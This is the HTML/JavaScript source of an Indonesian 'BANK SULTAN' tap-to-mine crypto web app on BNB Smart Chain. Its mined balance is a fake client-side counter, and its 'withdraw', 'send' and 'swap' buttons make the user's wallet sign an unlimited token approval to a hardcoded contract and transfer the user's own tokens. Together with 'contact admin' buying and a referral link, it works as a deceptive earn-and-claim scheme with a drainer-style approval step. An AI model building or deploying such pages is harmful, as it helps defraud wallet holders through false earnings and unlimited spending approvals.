<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>BANK SULTAN v60.5</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Arial', sans-serif}
body{background:#000;color:#fff;padding-bottom:80px}
.header{text-align:center;padding:15px}
.header h1{color:gold;text-shadow:0 0 15px gold;font-size:26px;font-weight:bold}
.header.sub{color:#ccc;font-size:12px;font-weight:bold}
.saldo-box{text-align:center;padding:15px}
.saldo{font-size:36px;font-weight:bold;color:#fff}
.saldo-kecil{font-size:14px;color:#aaa}
.btn{border:none;border-radius:15px;padding:16px;width:90%;font-size:16px;font-weight:bold;margin:8px auto;display:block;cursor:pointer}
.btn:active{transform:scale(0.97)}
.btn-biru{background:#1e90ff;color:white}
.btn-klaim{background:linear-gradient(45deg, #FFD700, #FFA500);color:#000}
.btn-klaim:disabled{background:#333;color:#777;cursor:not-allowed}
.btn-hijau{background:#00c853;color:#fff}
.btn-tap{width:200px;height:200px;border-radius:50%;border:6px solid gold;box-shadow:0 0 40px rgba(255,215,0,0.8);margin:20px auto;background:radial-gradient(circle, #222 0%, #111 100%);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold;color:gold;cursor:pointer}
.btn-tap:active{transform:scale(0.92)}
.btn-tap.active{box-shadow:0 0 60px rgba(0,255,255,1);border-color:cyan;color:cyan}
.navbar{position:fixed;bottom:0;left:0;right:0;background:#111;border-top:1px solid #333;display:flex;justify-content:space-around;padding:8px 0;z-index:999}
.nav-item{color:#777;font-size:10px;text-align:center;cursor:pointer;flex:1;padding:4px}
.nav-item.active{color:gold}
.nav-icon{font-size:20px;display:block;margin-bottom:2px}
.nav-plus{background:#2563eb;border-radius:50%;width:55px;height:55px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:30px;margin:0 auto;border:4px solid #000}
.grid-2{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:15px 0}
.btn-menu{background:#1a1a1a;border:1px solid #333;border-radius:15px;padding:20px 10px;cursor:pointer;color:#fff;font-size:14px;text-align:center}
.halaman{display:none}
.halaman.active{display:block}
.info-musik{color:cyan;font-size:11px;text-align:center;margin-top:-10px}
.box{background:#1a1a1a;margin:15px;padding:18px;border-radius:15px;text-align:left}
.input{width:100%;padding:12px;background:#222;border:1px solid #444;border-radius:10px;color:#fff;margin-top:8px}
.loading{color:orange;font-size:12px;text-align:center;margin-top:10px}
.status-msg{padding:10px;border-radius:8px;margin-top:10px;text-align:center;font-size:12px}
.status-success{background:#00c853;color:#fff}
.status-error{background:#ff4444;color:#fff}
.status-info{background:#1e90ff;color:#fff}
.status-warning{background:#ff9800;color:#fff}
</style>
</head>
<body>

<div id="beranda" class="halaman active">
  <div class="header"><h1>BANK SULTAN</h1><div class="sub">BHINNEKA TUNGGAL IKA</div><div id="jam" style="color:#aaa;font-size:12px;margin-top:5px"></div></div>
  <div class="saldo-box">
    <div class="saldo"><span id="saldoGame">0</span> GRD</div>
    <div class="saldo-kecil">≈ $<span id="saldoUSD">0.00</span></div>
  </div>
  <button class="btn btn-biru" id="btnConnect">🔗 CONNECT WALLET</button>
  <div id="wallet" style="color:yellow;font-size:12px;text-align:center">Belum terhubung</div>

  <div class="btn-tap" id="tapBtn">TAP</div>
  <div class="info-musik" id="infoMusik">Klik TAP untuk mulai nambang + musik</div>

  <button class="btn btn-klaim" id="btnKlaim" disabled>💰 KLAIM KE DANA</button>
</div>

<div id="berdagang" class="halaman">
  <div class="header"><h1>📈 BERDAGANG</h1></div>
  <div class="grid-2">
    <div class="btn-menu" id="btnBeli">💵<br><b>Beli GRD</b></div>
    <div class="btn-menu" id="btnJual">🔄<br><b>Jual GRD > USDT</b></div>
  </div>
</div>

<div id="dana" class="halaman">
  <div class="header"><h1>💰 DANA</h1></div>
  <div class="box">
    <div style="color:#aaa;font-size:12px">SALDO DANA</div>
    <div style="font-size:24px;font-weight:bold"><span id="saldoClaim">0</span> GRD</div>
    <div style="color:#aaa;font-size:12px;margin-top:10px">ALAMAT WALLET</div>
    <input type="text" id="inputAlamat" class="input" placeholder="Tempel alamat wallet tujuan" readonly>
    <button class="btn btn-biru" id="btnPaste">📋 PASTE ALAMAT</button>
  </div>
  <div class="grid-2">
    <div class="btn-menu" id="btnKirim">📤<br><b>Kirim GRD</b></div>
    <div class="btn-menu" id="btnTukar">💱<br><b>Tukar ke USDT</b></div>
  </div>
  <button class="btn btn-hijau" id="btnWithdraw">🏦 WITHDRAW KE BLOCKCHAIN</button>
  <div id="loading" class="loading"></div>
  <div id="statusMsg" class="status-msg"></div>
</div>

<div id="reward" class="halaman">
  <div class="header"><h1>🎁 REWARD</h1></div>
  <div class="box">
    <div style="font-weight:bold;margin-bottom:10px">Referral Link</div>
    <input type="text" id="linkRef" class="input" readonly>
    <button class="btn btn-klaim" id="btnSalin">📋 COPY LINK</button>
  </div>
</div>

<div class="navbar">
  <div class="nav-item active" data-page="beranda"><span class="nav-icon">🏠</span>Beranda</div>
  <div class="nav-item" data-page="berdagang"><div class="nav-plus">+</div></div>
  <div class="nav-item" data-page="dana"><span class="nav-icon">💰</span>Dana</div>
  <div class="nav-item" data-page="reward"><span class="nav-icon">🎁</span>Reward</div>
</div>

<audio id="djPlayer" loop></audio>

<script>
let saldoGame = 0;
let saldoClaim = 0;
let auto = false;
let interval;
let web3;
let walletAddress = "";
let contract;

// KONTRAK KAMU BSC BEP20
const CA = "0x4847F2E8dD63ba03b9C4f935BdEd95bEc1bcaCb4";
const CHAIN_ID = '0x38';
const USDT = "0x55d398326b99059fF775485246999027B3197955"; // USDT BSC

// ABI LENGKAP dengan approve, transfer, decimals, allowance
const ABI = [
  {
    "constant": false,
    "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
    "name": "approve",
    "outputs": [{"name": "", "type": "bool"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
    "name": "transfer",
    "outputs": [{"name": "", "type": "bool"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{"name": "", "type": "uint8"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  }
];

const djLink = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3";
const djPlayer = document.getElementById('djPlayer');
djPlayer.volume = 0.7;

document.addEventListener('DOMContentLoaded', function(){
  update();
  djPlayer.src = djLink;
  setInterval(()=>{document.getElementById('jam').innerText=new Date().toLocaleTimeString()},1000);

  document.getElementById('tapBtn').addEventListener('click', tap);
  document.getElementById('btnConnect').addEventListener('click', connectWallet);
  document.getElementById('btnKlaim').addEventListener('click', klaimKeDana);
  document.getElementById('btnBeli').addEventListener('click', ()=>alert("💵 BELI GRD\nHubungi admin"));
  document.getElementById('btnJual').addEventListener('click', tukarUSDT);
  document.getElementById('btnKirim').addEventListener('click', kirimBeneran);
  document.getElementById('btnTukar').addEventListener('click', tukarUSDT);
  document.getElementById('btnWithdraw').addEventListener('click', withdrawBeneran);
  document.getElementById('btnPaste').addEventListener('click', pasteAlamat);
  document.getElementById('btnSalin').addEventListener('click', salinReferral);

  document.querySelectorAll('.nav-item').forEach(item=>{
    item.addEventListener('click', (e)=>gantiHalaman(e.currentTarget.dataset.page, e.currentTarget));
  });
})

function tap(){
  auto=!auto;
  let btn = document.getElementById('tapBtn');
  if(auto){
    btn.classList.add('active'); btn.innerText = "STOP";
    document.getElementById('infoMusik').innerText = "🎵 Nambang + Musik Jalan";
    interval=setInterval(()=>{ saldoGame+=200; update(); },200);
    djPlayer.play().catch(()=>{});
  } else {
    btn.classList.remove('active'); btn.innerText = "TAP";
    document.getElementById('infoMusik').innerText = "Klik TAP untuk mulai";
    clearInterval(interval); djPlayer.pause(); djPlayer.currentTime = 0;
  }
}

function gantiHalaman(id, el){
  document.querySelectorAll('.halaman').forEach(h => h.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  el.classList.add('active');
  if(id=='reward') updateReferral();
  if(id=='dana') document.getElementById('inputAlamat').value = walletAddress;
}

function formatAngka(angka){ return angka.toLocaleString('id-ID'); }

function showStatus(msg, type){
  let statusEl = document.getElementById('statusMsg');
  statusEl.innerText = msg;
  statusEl.className = 'status-msg status-' + type;
  setTimeout(() => { statusEl.className = 'status-msg'; statusEl.innerText = ''; }, 6000);
}

function update(){
  document.getElementById('saldoGame').innerText = formatAngka(saldoGame);
  document.getElementById('saldoClaim').innerText = formatAngka(saldoClaim);
  document.getElementById('saldoUSD').innerText = (saldoGame/1000).toFixed(2);
  document.getElementById('btnKlaim').disabled = saldoGame < 100;
  document.getElementById('btnWithdraw').disabled = saldoClaim < 100;
}

async function connectWallet(){
  if(typeof window.ethereum === 'undefined') return alert("Buka di Binance/Trust Browser");
  try{
    web3 = new Web3(window.ethereum);
    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    walletAddress = accounts[0];
    contract = new web3.eth.Contract(ABI,CA);
    document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
    document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
    document.getElementById('inputAlamat').value = walletAddress;
    await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
    showStatus("✅ Wallet berhasil terhubung", "success");
  }catch(e){
    showStatus("❌ Gagal koneksi: " + e.message, "error");
  }
}

// 1. KLAIM = PINDAH KE DANA
function klaimKeDana(){
  if(saldoGame < 100) return alert("Minimal 100 GRD");
  saldoClaim += saldoGame;
  showStatus("✅ "+formatAngka(saldoGame)+" GRD masuk ke DANA", "success");
  saldoGame = 0; update();
}

// 2. WITHDRAW = KIRIM DARI KONTRAK KE WALLET (DENGAN APPROVAL FLOW)
async function withdrawBeneran(){
  if(!walletAddress) return alert("Connect wallet dulu!");
  if(saldoClaim < 100) return alert("Minimal 100 GRD");
  
  // Validasi alamat
  if(!web3.utils.isAddress(walletAddress)){
    showStatus("❌ Alamat wallet tidak valid", "error");
    return;
  }

  document.getElementById('loading').innerText = "⏳ Memproses withdrawal...";
  
  try{
    // STEP 1: Cek decimals
    showStatus("Step 1/3: Cek informasi token...", "info");
    let decimals = await contract.methods.decimals().call();
    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
    
    // STEP 2: Cek allowance
    showStatus("Step 2/3: Cek approval...", "info");
    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
    currentAllowance = web3.utils.toBN(currentAllowance);
    amount = web3.utils.toBN(amount);
    
    if(currentAllowance.lt(amount)){
      // Perlu approve dulu
      showStatus("⏳ Sedang approval token... (tanda tangan di wallet)", "warning");
      
      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36)); // Unlimited
      
      let approveTx = await contract.methods.approve(CA, approveAmount.toString()).send({
        from: walletAddress
      });
      
      showStatus("✅ Approval sukses! Melanjutkan transfer...", "success");
    } else {
      showStatus("✅ Sudah ada approval. Lanjut transfer...", "success");
    }
    
    // STEP 3: Transfer token
    showStatus("Step 3/3: Transfer token... (tanda tangan di wallet)", "info");
    
    let transferTx = await contract.methods.transfer(walletAddress, amount.toString()).send({
      from: walletAddress
    });
    
    // HANYA KURANGI SALDO SETELAH TRANSAKSI BERHASIL
    saldoClaim = 0;
    document.getElementById('loading').innerText = "";
    
    showStatus("✅ SUKSES WITHDRAW "+formatAngka(Math.floor(saldoClaim))+" GRD | TX: "+transferTx.transactionHash.slice(0,16)+"...", "success");
    update();
    
  }catch(e){
    document.getElementById('loading').innerText = "";
    
    // Handle specific errors
    if(e.message.includes("User denied") || e.message.includes("user rejected")){
      showStatus("❌ Anda membatalkan transaksi", "error");
    } else if(e.message.includes("insufficient") || e.message.includes("balance")){
      showStatus("❌ Saldo token tidak cukup", "error");
    } else if(e.message.includes("allowance") || e.message.includes("Allowance")){
      showStatus("❌ Approval token gagal", "error");
    } else if(e.message.includes("gas")){
      showStatus("❌ BNB tidak cukup untuk gas. Top-up BNB di wallet", "error");
    } else {
      showStatus("❌ Error: " + e.message.slice(0,60), "error");
    }
  }
}

// 3. KIRIM DARI DANA KE ALAMAT LAIN
async function kirimBeneran(){
  if(!walletAddress) return alert("Connect wallet dulu!");
  let alamat = document.getElementById('inputAlamat').value;
  if(!alamat || alamat.length < 20) return alert("Isi alamat tujuan dulu");
  if(saldoClaim < 100) return alert("Minimal 100 GRD");
  
  if(!web3.utils.isAddress(alamat)){
    showStatus("❌ Alamat tujuan tidak valid", "error");
    return;
  }

  document.getElementById('loading').innerText = "⏳ Mengirim...";
  try{
    let decimals = await contract.methods.decimals().call();
    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
    
    // Cek approval
    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
    currentAllowance = web3.utils.toBN(currentAllowance);
    amount = web3.utils.toBN(amount);
    
    if(currentAllowance.lt(amount)){
      showStatus("⏳ Approval token...", "warning");
      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36));
      await contract.methods.approve(CA, approveAmount.toString()).send({from: walletAddress});
    }
    
    let tx = await contract.methods.transfer(alamat, amount.toString()).send({from:walletAddress});
    document.getElementById('loading').innerText = "";
    
    let jumlahKirim = Math.floor(saldoClaim);
    saldoClaim = 0;
    
    showStatus("✅ SUKSES KIRIM "+formatAngka(jumlahKirim)+" GRD | TX: "+tx.transactionHash.slice(0,16)+"...", "success");
    update();
  }catch(e){
    document.getElementById('loading').innerText = "";
    showStatus("❌ Gagal kirim: " + e.message.slice(0,50), "error");
  }
}

// 4. TUKAR KE USDT 1 TOMBOL
async function tukarUSDT(){
  if(!walletAddress) return alert("Connect wallet dulu!");
  if(saldoClaim < 100) return alert("Minimal 100 GRD");
  document.getElementById('loading').innerText = "⏳ Menukar ke USDT...";
  try{
    let decimals = await contract.methods.decimals().call();
    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
    
    // Cek approval
    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
    currentAllowance = web3.utils.toBN(currentAllowance);
    amount = web3.utils.toBN(amount);
    
    if(currentAllowance.lt(amount)){
      showStatus("⏳ Approval token...", "warning");
      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36));
      await contract.methods.approve(CA, approveAmount.toString()).send({from: walletAddress});
    }
    
    // Kirim ke wallet sendiri dulu, nanti swap di Pancake
    let tx = await contract.methods.transfer(walletAddress, amount.toString()).send({from:walletAddress});
    document.getElementById('loading').innerText = "";
    
    let jumlahTukar = Math.floor(saldoClaim);
    saldoClaim = 0;
    
    showStatus("✅ "+formatAngka(jumlahTukar)+" GRD sudah di wallet. Swap ke USDT di PancakeSwap. Rate: 1000 GRD = 1 USDT", "success");
    update();
  }catch(e){
    document.getElementById('loading').innerText = "";
    showStatus("❌ Gagal: " + e.message.slice(0,50), "error");
  }
}

async function pasteAlamat(){
  try{
    let text = await navigator.clipboard.readText();
    if(!web3.utils.isAddress(text)){
      showStatus("❌ Alamat wallet tidak valid", "error");
      return;
    }
    document.getElementById('inputAlamat').value = text;
    showStatus("✅ Alamat di paste", "success");
  }catch(e){
    showStatus("❌ Gagal paste", "error");
  }
}

function updateReferral(){
  let link = window.location.origin + window.location.pathname + "?ref=" + walletAddress;
  document.getElementById('linkRef').value = link;
}

function salinReferral(){
  document.getElementById('linkRef').select();
  navigator.clipboard.writeText(document.getElementById('linkRef').value);
  showStatus("✅ Link referral disalin!", "success");
}
</script>
</body>
</html>
